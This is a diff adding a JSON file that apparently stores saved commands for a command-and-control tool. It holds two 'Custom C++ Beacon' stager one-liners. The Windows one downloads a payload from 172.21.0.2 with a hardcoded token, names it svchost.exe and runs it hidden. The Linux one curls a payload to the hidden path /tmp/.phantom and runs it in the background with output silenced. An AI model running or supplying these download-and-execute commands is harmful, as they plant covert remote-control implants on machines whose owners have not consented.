@@ -1,0 +1,20 @@
+[
+    {
+        "id": "38bda9be-8cc4-4f32-9038-c76d320a7ff2",
+        "platform": "windows",
+        "command": "Invoke-WebRequest -Uri 'http://172.21.0.2:443/api/v1/payload?auth=PhantomDefaultToken' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '172.21.0.2 443' -WindowStyle Hidden",
+        "description": "Custom C++ Beacon",
+        "source": "c2_shell",
+        "created_at": "2026-06-01 17:34:15",
+        "_hash": "caf70f6dd82aa524fc0b023b10a2a1c59404525e9a4fed483f8dbca3ad16f1eb"
+    },
+    {
+        "id": "b80ff220-786f-4bc7-9567-0a07f0e49b64",
+        "platform": "linux",
+        "command": "curl -s 'http://172.21.0.2:443/api/v1/payload_linux?auth=PhantomDefaultToken' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom 172.21.0.2 443 &>/dev/null &",
+        "description": "Custom C++ Beacon",
+        "source": "c2_shell",
+        "created_at": "2026-06-01 17:47:52",
+        "_hash": "95d32ec6b9f61b1280b7d19b614c8aa49e9b89d554befdf9b954d4276585874c"
+    }
+]
